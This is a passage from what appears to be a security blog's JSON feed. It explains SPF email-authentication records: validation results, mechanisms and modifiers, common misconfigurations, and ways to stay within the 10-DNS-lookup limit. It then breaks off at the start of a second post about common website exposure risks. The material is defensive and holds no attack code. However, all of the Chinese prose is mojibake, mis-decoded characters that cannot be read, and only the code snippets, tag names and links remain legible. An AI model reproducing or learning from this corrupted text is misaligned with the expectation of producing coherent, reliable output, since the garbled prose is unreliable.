ç´€éŒ„çš„èªæ³•èªªè¤‡é›œä¸è¤‡é›œï¼Œä½†å„ç¨®å°ç´°ç¯€å¸¸å¸¸è®“äººé ­ç–¼ï¼Œä¸€å€‹å¾ˆå®Œæ•´çš„èªæ³•ä»‹ç´¹å¯ä»¥åƒè€ƒ <a href=\"https://dmarcian.com/spf-syntax-table\">Dmarcian-SPF record syntax</a>ã€‚</p>\n<p>å¦‚æœæƒ³é…è‘—çœŸå¯¦çš„ä¿¡ä»¶çœ‹ï¼Œå»ºè­°ä½ å¯ä»¥ç”¨ <a href=\"https://mxtoolbox.com/SuperTool.aspx\">mxtoolbox</a> ä¹‹é¡çš„å·¥å…·ä¸€é‚ŠæŸ¥è©¢ SPF ç´€éŒ„ï¼Œä¸€é‚Šé»é–‹ä¿¡ä»¶åŸå§‹å…§å®¹çœ‹ SPF é©—è­‰çµæœï¼š</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-spf/spf-result.png\" alt=\"\"></p>\n<p>é€™è£¡æˆ‘å€‘å…ˆè¬›ä¸€ä¸‹ SPF é©—è­‰æ™‚æœƒå‡ºç¾çš„å¹¾ç¨®çµæœï¼š</p>\n<ul>\n<li><code>Pass</code>ï¼šIP æ–¼åˆ—è¡¨ä¸­ï¼Œé©—è­‰æˆåŠŸã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šaccept</li>\n<li><code>Fail</code>ï¼šIP ä¸åœ¨åˆ—è¡¨ä¸­ï¼Œé©—è­‰å¤±æ•—ã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šreject</li>\n<li><code>SoftFail</code>ï¼šIP ä¸åœ¨åˆ—è¡¨ä¸­ï¼Œé©—è­‰å¤±æ•—ï¼Œä½†ä¸è¦ç›´æ¥ rejectã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šaccept but markï¼ˆæ¨™æ³¨å¤±æ•—ï¼‰</li>\n<li><code>Neutral</code>ï¼šä¸äºˆç½®è©•ï¼Œå³ä½¿ IP ä¸åœ¨åˆ—è¡¨ä¸­ä¹Ÿä¸è¦–ç‚ºå¤±æ•—ï¼Œè¦–åŒ <code>None</code>ã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šaccept</li>\n<li><code>None</code>ï¼šæ²’æœ‰è¶³å¤ è³‡è¨Šå¾—å‡ºçµè«–ï¼ˆä¾‹å¦‚æœªæ‰¾åˆ° SPF ç´€éŒ„ï¼‰ã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šaccept</li>\n<li><code>PermError</code>ï¼šé©—è­‰éç¨‹å‡ºéŒ¯ï¼Œä¾‹å¦‚æ ¼å¼éŒ¯èª¤çš„ SPF ç´€éŒ„ã€‚æ¡å–è¡Œç‚ºæ˜¯ï¼šunspecifiedï¼ˆæœªå®šç¾©ï¼‰ï¼Œäº¤ç”±æ”¶ä¿¡æ–¹ email server è‡ªè¡Œæ±ºå®šã€‚</li>\n<li><code>TempError</code>ï¼šé©—è­‰éç¨‹å‡ºéŒ¯ï¼Œä½†æ²’æœ‰ PermError åš´é‡ã€‚æ¡å–è¡Œç‚ºå¯èƒ½æ˜¯ accept æˆ–æš«æ™‚ rejectï¼Œç”±æ”¶ä¿¡æ–¹ email server è‡ªè¡Œæ±ºå®šã€‚</li>\n</ul>\n<p>SPF çš„å°åœ°é›·å°±åœ¨æ–¼ï¼Œå¾ˆå¤šç¨®è¨­ç½®ä¸Šçš„å°å¤±èª¤å¯èƒ½å°è‡´ PermErrorã€TempErrorã€æˆ–æ˜¯å…¶ä»–å‰Šå¼± SPF å®‰å…¨æ€§çš„çµæœã€‚å› ç‚ºæˆ‘å€‘ç„¡æ³•é æœŸæ”¶ä¿¡æ–¹ email server æœƒæ¡å–ä»€éº¼è¡Œç‚ºï¼Œæ‰€ä»¥ä¹Ÿç„¡æ³•ç¢ºä¿é€åˆ°æ”¶ä»¶äººæ‰‹ä¸Šçš„ä¿¡ä»¶éƒ½æœ‰å—åˆ° SPF ç´€éŒ„çš„ä¿è­·ã€‚è¦æ˜¯å°æ–¹é‡åˆ° Error ä¸€å¾‹æ¡å– acceptï¼Œæˆ–æ˜¯ä¹¾è„†é¸æ“‡å¿½ç•¥é€™ç­† SPF ç´€éŒ„ï¼Œé‚£ä¸å°±å½¢åŒè™›è¨­äº†å—ï¼Ÿ</p>\n<p>ä¸‹é¢æˆ‘å€‘çœ‹çœ‹ SPF ç´€éŒ„ä¸­çš„æ¨™ç±¤ï¼š 8 å€‹æ©Ÿåˆ¶ï¼ˆmechanismï¼‰è·Ÿ 2 ç¨®ä¿®é£¾ï¼ˆmodifierï¼‰ï¼Œä»¥åŠä»–å€‘å¯èƒ½è¸©åˆ°åœ°é›·çš„æƒ…å½¢ã€‚æ‰€æœ‰çš„æ¨™ç±¤ï¼ˆtagï¼‰èˆ‡æ¨™ç±¤å€¼ï¼ˆtag valueï¼‰ä¸­é–“éƒ½ä¸èƒ½æœ‰ç©ºç™½ã€‚æ­¤å¤–ï¼Œè‡³å°‘åœ¨å‡ºç¾æ›´æ–°ç‰ˆæœ¬çš„ SPF specä¹‹å‰ï¼Œç¾éšæ®µ SPF ç´€éŒ„é–‹é ­å¿…é ˆæ˜¯ <code>v=spf1</code>ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" /><figcaption><p>ç°¡çŸ­çš„ SPF recordï¼ˆå–è‡ª ç¶­åŸºç™¾ç§‘ï¼‰</p>\n</figcaption></figure></p>\n<p>ä»¥ä¸‹æˆ‘å€‘ç¨±ä¿¡ä»¶çš„ä¾†æºï¼ˆä¹Ÿå°±æ˜¯ <code>smtp.MailFrom</code>ï¼‰ç‚º sender-domain æˆ– sender-ipï¼Œæ¨™ç±¤å€¼ç‚º target-domain æˆ– target-ipã€‚</p>\n<h3 id=\"mechanisms\"><a class=\"direct-link\" href=\"#mechanisms\">#</a> Mechanisms</h3>\n<p>8 å€‹ mechanism ç‚ºï¼š <code>all, ip4, ip6, a, mx, ptr, exists, include</code></p>\n<p>SPF ç´€éŒ„é©—è­‰æ™‚æ˜¯ç…§è‘— mechanism å‡ºç¾çš„é †åºæ¯”å°çš„ï¼Œæ¯”å°çµæœç‚º matchã€ not-matchã€æˆ– error ä¹‹ä¸€ï¼Œä¸€æ—¦æˆåŠŸæ‰¾åˆ° match æˆ–æ˜¯ç™¼ç”Ÿ error å°±æœƒåœä¸‹ã€‚</p>\n<p>åœ¨æ¯å€‹ mechanism å‰éƒ½å¯èƒ½å¸¶æœ‰ä¸€å€‹ qualifier ç¬¦è™Ÿï¼Œç‚ºä¸‹åˆ—å…¶ä¸€ï¼š</p>\n<ul>\n<li><code>pass(+)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ passï¼ˆå³ç™½åå–®ï¼‰ã€‚é è¨­å€¼ï¼Œå¯ä»¥çœç•¥ï¼ˆ <code>+all</code> åŒ <code>all</code>ï¼‰</li>\n<li><code>neutral(?)</code>ï¼šNone ï¼Œç­‰åŒæ²’æœ‰ policyã€‚</li>\n<li><code>softfail(~)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ failï¼Œä»è¦æ¨™æ³¨ä¸¦æ¥å—ã€‚</li>\n<li><code>fail(-)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ failï¼ˆå³é»‘åå–®ï¼‰ã€‚</li>\n</ul>\n<h5 id=\"all\"><a class=\"direct-link\" href=\"#all\">#</a> all</h5>\n<p>èªæ³•ç‚ºï¼š <code>[qualifier]all</code></p>\n<p>å¿…é ˆåœ¨ç´€éŒ„æœ€æœ«ï¼Œæ˜¯æœ€å¾Œä¸€å€‹åˆ¤æ–·æ¢ä»¶ã€‚ä¸€èˆ¬ä¾†èªªæ‡‰è¨­ç½®æœ€åš´è¬¹çš„ <code>-all</code>ï¼Œè¡¨ç¤ºé™¤äº†å‰è¿° mechanism æŒ‡å®šçš„ target IP å¤–ä¸€å¾‹æ‹’çµ•ï¼ˆ<code>fail(-)</code>ï¼‰ï¼Œæ‰€ä»¥å¦‚æœå‰é¢çš„ mechanism éƒ½æ²’å°åˆ°ï¼Œæœ€å¾Œå°±æœƒå¤±æ•—ã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>ç¼ºå°‘ <code>all</code>ï¼š<code>PermError</code></li>\n<li><code>all</code> å¾Œé¢çš„ä»»ä½•æ¨™ç±¤å‡æœƒè¢«å¿½ç•¥</li>\n<li><code>?all, +all</code>ï¼šä¸ç®¡å‰é¢æœ‰æ²’æœ‰å°åˆ°ï¼Œéƒ½è¦–ç‚º passã€‚SPF è·Ÿæ²’è¨­ä¸€æ¨£ã€‚</li>\n</ul>\n<h5 id=\"ip4%2C-ip6\"><a class=\"direct-link\" href=\"#ip4%2C-ip6\">#</a> ip4, ip6</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]ip4:target-ip[cidr-length]</code> æˆ– <code>[qualifier]ip6:target-ip[cidr-length]</code></p>\n<p>åˆ†åˆ¥ç”¨ ipv4 èˆ‡ ipv6 å®šç¾©çš„ IP åˆ—è¡¨ï¼Œåªè¦æ˜¯ CIDR è¡¨ç¤ºæ³•éƒ½å¯ä»¥ï¼Œä¾‹å¦‚ <code>192.168.0.1/16</code>ã€‚æ–œç·šå¾Œçš„ prefix length å¦‚æœçœç•¥ï¼Œæœƒé è¨­ç‚º <code>/32</code>ï¼ˆipv4ï¼‰èˆ‡ <code>/128</code>ï¼ˆipv6ï¼‰ã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>ä¸åˆæ³•çš„ IPï¼š<code>PermError</code></li>\n</ul>\n<h5 id=\"a\"><a class=\"direct-link\" href=\"#a\">#</a> a</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]a:[target-domain][cidr-length]</code></p>\n<p>æª¢æŸ¥ sender IP æ˜¯å¦åœ¨ target-domain çš„ A æˆ– AAAA ç´€éŒ„ä¸­ï¼Œå³æ˜¯å¦ç‚º target-domain æ‰€æ“æœ‰çš„ IPã€‚å¦‚æœæ²’æœ‰å¯« target-domain å°±æœƒé»˜èªç‚ºç•¶å‰ SPF ç´€éŒ„çš„ç¶²åŸŸï¼Œ <code>a</code> ç­‰åŒ <code>a:sender-domain</code>ã€‚</p>\n<h5 id=\"mx\"><a class=\"direct-link\" href=\"#mx\">#</a> mx</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]mx:[target-domain][cidr-length]</code></p>\n<p>æª¢æŸ¥ sender IP æ˜¯å¦åœ¨ target-domain çš„ MX ç´€éŒ„ä¸­ã€‚å¦‚æœæ²’æœ‰å¯« target-domain å°±æœƒé»˜èªç‚ºç•¶å‰ SPF ç´€éŒ„çš„ç¶²åŸŸï¼Œ <code>mx</code> ç­‰åŒ <code>mx:sender-domain</code>ã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>è‹¥ä¸€å€‹ MX ç´€éŒ„åŒ…å«è¶…é 10 å€‹ A æˆ– AAAA ç´€éŒ„ï¼š<code>PermError</code></li>\n</ul>\n<h5 id=\"ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\"><a class=\"direct-link\" href=\"#ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\">#</a> ptr ï¼ˆå·²å»¢æ£„ï¼‰</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]ptr:[target-domain]</code></p>\n<p>é€²è¡Œ reverse DNS lookupï¼Œè‹¥å¾—åˆ°çš„ç¶²åŸŸæ˜¯ <code>smtp.MailFrom</code> æˆ–å…¶å­ç¶²åŸŸï¼Œå‰‡ passã€‚æ­¤æ©Ÿåˆ¶é€Ÿåº¦æ…¢ä¸”æœƒÂ .arpa name servers çš„è² æ“”ï¼Œè«‹å‹¿ä½¿ç”¨ã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>è‹¥ä¸€å€‹ PTR ç´€éŒ„åŒ…å«è¶…é 10 å€‹ A æˆ– AAAA ç´€éŒ„ï¼Œåªçœ‹å‰åå€‹å¾Œé¢å¿½ç•¥</li>\n</ul>\n<h5 id=\"exists\"><a class=\"direct-link\" href=\"#exists\">#</a> exists</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]exists:target-domain</code></p>\n<p>è‹¥ target-domain å­˜åœ¨ A ç´€éŒ„ï¼Œè¦–ç‚º passã€‚</p>\n<h5 id=\"include\"><a class=\"direct-link\" href=\"#include\">#</a> include</h5>\n<p>èªæ³•ç‚ºï¼š<code>[qualifier]include:target-domain</code></p>\n<p>è·Ÿå¯«ç¨‹å¼å‘¼å«å¦ä¸€å€‹å‡½æ•¸çš„æ¦‚å¿µé¡ä¼¼ï¼Œæœƒæª¢æŸ¥ target-domain çš„ SPF ç´€éŒ„ä¸¦ä¸”ä¸€ç›´éè¿´æŸ¥è©¢ä¸‹å»ï¼Œç›´åˆ°æ¯”å°éæ¯ä¸€å€‹ IPã€‚ä½† include ä¸ä»£è¡¨æŠŠå°æ–¹çš„ SPF ç´€éŒ„ inline æ’å…¥è‡ªå·±çš„ï¼Œè€Œæ˜¯è·³åˆ°å°æ–¹çš„ SPF ç´€éŒ„çš„ context ä¸­æ¯”å°ï¼Œæœ€å¾Œå¾—åˆ° matchã€ not-matchã€æˆ– error çš„çµæœã€‚</p>\n<p>åœ¨éè¿´éç¨‹ä¸­ï¼Œå­ç´€éŒ„çš„é©—è­‰çµæœå°æ¯ç´€éŒ„çš„ include æ©Ÿåˆ¶çš„å½±éŸ¿ç‚ºï¼š</p>\n<ul>\n<li><code>Pass</code>â†’ include åˆ¤å®šï¼šmatch</li>\n<li><code>Fail, Softfail, Neutral</code>â†’ include åˆ¤å®šï¼šnot-match</li>\n<li><code>PermError, None</code>â†’ include åˆ¤å®šï¼š<code>PermError</code></li>\n<li><code>TempError</code>â†’ include åˆ¤å®šï¼š<code>TempError</code></li>\n</ul>\n<p>include æ©Ÿåˆ¶é©åˆç”¨åœ¨æ ¸å‡†å¤–éƒ¨ï¼ˆè·¨åŸŸï¼‰çš„ email providerï¼Œä¾‹å¦‚ç•¶æˆ‘å€‘ä½¿ç”¨ç¬¬ä¸‰æ–¹å¯„ä»¶æœå‹™æ™‚ï¼Œå°±è¦æŠŠå°æ–¹çš„ SPF ç´€éŒ„ç”¨ include æ©Ÿåˆ¶æ”¾åˆ°æˆ‘å€‘çš„SPF ç´€éŒ„ã€‚</p>\n<h3 id=\"modifiers\"><a class=\"direct-link\" href=\"#modifiers\">#</a> Modifiers</h3>\n<p>2 ç¨®ä¿®é£¾ç‚ºï¼š <code>redirect, exp</code></p>\n<h5 id=\"redirect\"><a class=\"direct-link\" href=\"#redirect\">#</a> redirect</h5>\n<p>èªæ³•ç‚ºï¼š<code>redirect:target-domain</code></p>\n<p>å¿…é ˆåœ¨ç´€éŒ„æœ€æœ«ï¼Œèˆ‡ all ä¸å¯åŒæ™‚å‡ºç¾ã€‚è‹¥å‰é¢çš„ mechanism é©—è­‰å®Œç•¢ä½†éƒ½æ²’æœ‰æ‰¾åˆ° matchï¼Œå°±ç”¨ target-domain çš„ SPF ç´€éŒ„å–ä»£è‡ªå·±çš„ã€‚èˆ‡ include çš„æ¯å­é—œä¿‚ä¸åŒï¼Œé€™è£¡ç”¨ inline æ¦‚å¿µæ’å…¥ï¼Œæ‰€ä»¥ä»»ä½•å ±éŒ¯è¦–ç‚ºç•¶å‰ SPF ç´€éŒ„çš„ Errorã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>è‹¥ target-domain æ²’æœ‰ SPF ç´€éŒ„ï¼š<code>PermError</code></li>\n<li><code>all</code> èˆ‡ <code>redirect</code> åªèƒ½å‡ºç¾ä¸€å€‹ï¼Œè‹¥ç´€éŒ„ä¸­å…©è€…åŒæ™‚å‡ºç¾å‰‡ <code>redirect</code> æœƒè¢«å¿½ç•¥</li>\n</ul>\n<h5 id=\"exp\"><a class=\"direct-link\" href=\"#exp\">#</a> exp</h5>\n<p>èªæ³•ç‚ºï¼š<code>exp:target-domain</code></p>\n<p>ä»£è¡¨ explanationï¼Œè‹¥ SPF ç´€éŒ„é©—è­‰çµæœç‚º <code>Fail</code>ï¼Œæœƒè¿”å› target-domain çš„ TXT ç´€éŒ„å…§çš„å­—ä¸²ã€‚</p>\n<p>åœ°é›·ï¼š</p>\n<ul>\n<li>è‹¥åœ¨ include çš„ target-domain çš„ SPF ç´€éŒ„ä¸­æ‰¾åˆ° expï¼Œæœƒå¿½ç•¥ï¼ˆæ¯å­é—œä¿‚ï¼‰ï¼›è‹¥åœ¨ redirect çš„ target-domain çš„ SPF ç´€éŒ„ä¸­æ‰¾åˆ° expï¼Œå‰‡æœƒå¿½ç•¥åŸç´€éŒ„çš„ expï¼ˆå–ä»£é—œä¿‚ï¼‰</li>\n</ul>\n<h3 id=\"%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\">#</a> å…¶ä»–åœ°é›·ï¼š</h3>\n<ul>\n<li>DNS å›å‚³ NXDOMAINï¼ˆæ²’æœ‰ <code>smtp.MailFrom</code> é€™å€‹ç¶²åŸŸï¼‰ï¼š<code>None</code></li>\n<li>æ‰¾åˆ°è¤‡æ•¸ç­† SPF ç´€éŒ„ï¼š<code>PermError</code></li>\n<li>SPF ç´€éŒ„é–‹é ­ä¸æ˜¯ <code>v=spf1</code>ï¼š<code>None</code></li>\n<li>SPF ç´€éŒ„è¢«è¨­æˆ SPF é¡å‹è€Œä¸æ˜¯ TXT é¡å‹ï¼šSPF é¡å‹ä½œç‚º SPF æ©Ÿåˆ¶ç™¼å±•çš„éæ¸¡æœŸä½¿ç”¨ï¼Œç›®å‰å·²å»¢æ£„ï¼Œè™•ç†æ–¹å¼æœªå®šç¾©</li>\n<li>ä»»ä½•èªæ³•éŒ¯èª¤ï¼Œä¾‹å¦‚ mechanism æˆ– modifier æ‹¼éŒ¯å­—ï¼Œæˆ–æ˜¯ä¸­é–“å¤šäº†ç©ºæ ¼ç­‰ï¼š<code>PermError</code></li>\n<li>DNS æŸ¥è©¢ timeout ã€server failure ç­‰é™¤äº† success èˆ‡ nxdomain çš„çµæœï¼š<code>TempError</code></li>\n<li>ç™¼ç”Ÿå¤§æ–¼å…©æ¬¡ void lookupï¼Œä¹Ÿå°±æ˜¯ DNS query å›å‚³ç©ºç™½çµæœï¼ˆsuccess èˆ‡ nxdomainï¼‰ï¼š<code>PermError</code></li>\n<li>æ¶µæ‹¬é™¤äº† <code>all, ip4, ip6, exp</code>ä¹‹å¤–çš„æ‰€æœ‰æ¨™ç±¤ï¼Œä»¥åŠå¾€ä¸‹éè¿´æ™‚éœ€è¦çš„ DNS queryï¼Œç¸½è¨ˆè¶…é 10 æ¬¡ DNS lookupï¼š<code>PermError</code></li>\n<li>è‹¥ redirect æˆ– include çš„ç¶²åŸŸæœ‰é‡è¤‡ï¼ˆä¾‹å¦‚ SPF ç´€éŒ„æœ‰ï¼š<code>include: a.com include:b.com</code> ä½†æ˜¯ <a href=\"http://a.com\">a.com</a> çš„ SPF ç´€éŒ„å…§å·²ç¶“æœ‰ <code>include:b.com</code>ï¼‰æˆ–æ˜¯ loopï¼ˆa include b â†’ b include c â†’ c include aï¼‰çš„æƒ…æ³ï¼Œä¸æœƒå ±éŒ¯ï¼Œä½†å¾ˆå¯èƒ½æœƒå°è‡´è¶…é 10 æ¬¡ DNS lookup</li>\n<li>è‹¥é©—è­‰ä¸€ç­† SPF ç´€éŒ„éœ€è¦è¶…é 20 ç§’ï¼š<code>TempError</code></li>\n<li>æ¯å€‹ modifier åœ¨ SPF ç´€éŒ„åªèƒ½å„å‡ºç¾ä¸€æ¬¡ï¼Œè‹¥è¶…éï¼š<code>PermError</code></li>\n</ul>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> å¤šå€‹å­ç¶²åŸŸ</h3>\n<p>å¦‚æœä½ æœ‰å¤šå€‹æœƒå¯„ä¿¡çš„ç¶²åŸŸï¼Œå°±è¦ç‚ºæ¯ä¸€å€‹åˆ†åˆ¥è¨­ç½® SPF ç´€éŒ„ã€‚å¦‚æœå®ƒå€‘æ˜¯å¾åŒä¸€å€‹ email server å¯„å‡ºå»çš„ï¼Œå¯ä»¥ç”¨ redirect çµ±ä¸€æŒ‡å‘ä¸€ç­†ç´€éŒ„ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚</p>\n<p>ä¸å¯„ä¿¡çš„ç¶²åŸŸï¼ˆparked domainï¼‰è«‹è¨­ç½® <code>v=spf1 -all</code>ã€‚</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> ç¬¬ä¸‰æ–¹æœå‹™</h3>\n<p>å¦‚æœä½ æœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„å¯„ä»¶æœå‹™ï¼Œä¾‹å¦‚ SendGridï¼Œä½ å¯ä»¥åœ¨ SPF ç´€éŒ„ä¸­ç”¨ include æ©Ÿåˆ¶æŠŠç¬¬ä¸‰æ–¹çš„ email server æ¶µè“‹é€²ä¾†ï¼Œä¾‹å¦‚ OneDegree ä½¿ç”¨å¾®è»Ÿ Outlookã€MailChimpã€FreshDeskã€SendGrid ç­‰æœå‹™ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<p>çœ¼å°–çš„äººå¯èƒ½æœƒç™¼ç¾ï¼Œä¸Šé¢çš„ç´€éŒ„æ€éº¼å°‘äº† <code>include:sendgrid.net</code>ï¼Ÿ</p>\n<p>å…¶å¯¦ï¼Œä½ å¦‚æœå»æŸ¥é€™å¹¾å€‹ç¬¬ä¸‰æ–¹æœå‹™çš„çš„ SPF ç´€éŒ„å°±æœƒç™¼ç¾ï¼ŒFreshDesk çš„ SPF ç´€éŒ„å°±å·²ç¶“æœ‰ <code>include:sendgrid.net</code> é€™ä¸€è¡Œï¼Œå› æ­¤æˆ‘å€‘å°±ä¸ç”¨åŠ å•¦ï¼é€™æ¨£ä¹Ÿå¯ä»¥çœä¸‹ä¸€ç­† DNS lookup çš„æ‰£æ‰“ï¼Œç•¢ç«Ÿ 10 æ¬¡ DNS lookup æ˜¯å¾ˆå®¹æ˜“è¶…éçš„ã€‚</p>\n<p>é€™è£¡ä¹Ÿé †ä¾¿å›ç­”ä¸€å€‹éå¸¸å¸¸è¦‹çš„å•é¡Œï¼š</p>\n<blockquote>\n<p>ã€è¶…é 10 æ¬¡ DNS lookup æ€éº¼è¾¦ã€</p>\n</blockquote>\n<p>åªè¦ä½ å¤šç”¨å¹¾å€‹ç¬¬ä¸‰æ–¹å¯„ä»¶æœå‹™ï¼Œé¦¬ä¸Šå°±è¶…é 10 æ¬¡äº†ï¼Œç•¢ç«Ÿä½  include ä»–ç®—ä¸€æ¬¡ï¼Œä»–ç”¨åˆ°çš„ includeã€aã€mx ç­‰ç­‰ä¹Ÿé€šé€šç®—ä½ çš„ï¼é‚„ä¸å«ä½ è‡ªå·±çš„ä¸€äº› email server å‘¢ï¼</p>\n<p>è§£æ±ºé€™å€‹å•é¡Œæœ‰å¹¾å€‹æ’‡æ­¥ï¼š</p>\n<p>å¦‚æœä½ æœ‰ lookup åˆ°ä½ è‡ªå·±çš„ä¸€äº› email serverï¼Œå¯ä»¥è€ƒæ…®ç”¨ ip4 ip6 ç›´æ¥ inline æ’é€²ä¾†ï¼Œä¾‹å¦‚ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydom.com -> include:sub1.mydom.com mx:sub2.mydom.com include:a.com  <br>sub1.mydom.com(SPF) -> ip4:192.x.x.3 ip4:172.x.x.x/16  <br>sub2.mydom.com(MX) -> 192.x.126.5<br><br>//after  <br>mydom.com -> ip4:192.x.x.3 ip4:172.x.x.x/16 ip4:192.x.126.5 include:a.com</code></pre>\n<p>æˆ–è€…ï¼Œå¯ä»¥è€ƒæ…®æŠŠé€™å€‹å¯„ä¿¡çš„ domain æ‹†æˆå¹¾å€‹ä¸åŒåŠŸç”¨çš„ subdomain ç„¶å¾ŒæŠŠç¬¬ä¸‰æ–¹å¯„ä»¶æœå‹™ä¹Ÿä¾æ“šç”¨é€”ç“œåˆ†ä¸‹å»ï¼Œé€™æ¨£æ¯å€‹ domain éƒ½æœ‰è‡ªå·±çš„ 10 æ¬¡æ‰£æ‰“ã€‚ä¾‹å¦‚ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydomain.com -> include:a.com include:b.com include:c.com <br><br>//after  <br>mydomain.com -> include:a.com   <br>customer.mydomain.com -> include:b.com   <br>partnership.mydomain.com -> include:c.com</code></pre>\n<p>å¦‚æœä½ å¾ˆä¸å¹¸åœ°ç”¨åˆ°äº†ä¸€å€‹ç¬¬ä¸‰æ–¹æœå‹™ï¼Œä»–è‡ªå·±çš„ SPF ç´€éŒ„å°±è¦ç”¨åˆ°å¿« 10 æ¬¡ lookupï¼Œé‚£åªèƒ½èªªâ€¦.æ›ä¸€å€‹å§ï¼Ÿï¼ˆæˆ–æ˜¯è¯ç¹«å°æ–¹çœ‹çœ‹ä»–å€‘æœ‰ä»€éº¼å»ºè­°å•¦ï¼‰</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<p>æ­å–œå¤§å®¶ææ‡‚ä¸‰åŠå®¢è£¡æœ€é›£è¨­å®šçš„ SPF å•¦ï¼ä½ å¯ä»¥åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°çš„ SPF ç´€éŒ„æª¢æŸ¥å™¨é€šå¸¸ä¸æœƒæŠŠæˆ‘å€‘è¨è«–çš„åœ°é›·å…¨éƒ½æª¢æŸ¥ä¸€æ¬¡ï¼Œå› ç‚ºå¯¦åœ¨æ˜¯å¤ªéº»ç…©å•¦QQ æ¨è–¦ä½ å¯ä»¥å¤šç”¨å¹¾ç¨®å·¥å…·é…è‘—é€™ç¯‡ä»”ç´°æª¢è¦–ä¸€ä¸‹ä½ çš„ SPF ç´€éŒ„ï¼Œç„¶å¾Œè·Ÿè‘—ä¸‹ä¸€ç¯‡è¨­å¥½ DMARC å¾Œï¼Œå°±å¯ä»¥åœ¨æ¯æ—¥çš„å½™æ•´å ±å‘Šä¸­çœ‹åˆ° SPF é€šéè·Ÿå¤±æ•—çš„ç´€éŒ„å›‰ï¼</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-14T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/",
      "title": "è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆä¸€ï¼‰-å¤§æ„äº†å•Šæ²’æœ‰é–ƒï¼å¸¸è¦‹ç¶²ç«™æ›éšªä½ ä¸­äº†å¹¾é …ï¼Ÿï¼",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>æ›éšªå°±æ˜¯æš´éœ²çš„é¢¨éšªï¼Œè€Œæ›éšªè©•ä¼°å°±æ˜¯<strong>æ¨¡æ“¬é§­å®¢åœ¨ç¶²è·¯ä¸Šæœå°‹ç¶²ç«™çš„è³‡è¨Šé€²è¡Œæ”»æ“Šéˆçš„æ§‹å»ºé€²è¡Œæš´éœ²çš„é¢¨éšªè©•ä¼°</strong>ï¼Œè€Œåœ¨å”åŠ©è¨±å¤šå•†æ¥­ç¶²ç«™ï¼ˆ e.g. æ“æœ‰æœƒå“¡ç™»å…¥ã€é‡‘æµåŠŸèƒ½ï¼‰åŸ·è¡Œéä¾µå…¥å¼çš„ç¶²è·¯æ›éšªæª¢æ¸¬æ™‚ï¼Œç™¼ç¾è¨±å¤šå•†æ¥­ç¶²ç«™çš„æª¢æ¸¬çµæœåœ¨å»é™¤æ¥µç«¯å€¼å¾Œï¼Œæœ‰ 60% ä»¥ä¸Šçš„ç¶²ç«™æ›éšªæ˜¯å…±é€šçš„ï¼Œä¾†é—œæ³¨ä¸€ä¸‹é€™äº›å¸¸è¦‹çš„ç¶²è·¯æ›éšªä½ çš„ç¶²ç«™æ˜¯å¦ä¹Ÿå¤§æ„äº†æ²’æœ‰é–ƒã€‚</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E6%91%98%E8%A6%81\"><a class=\"direct-link\" href=\"#%E6%91%98%E8%A6%81\">#</a> 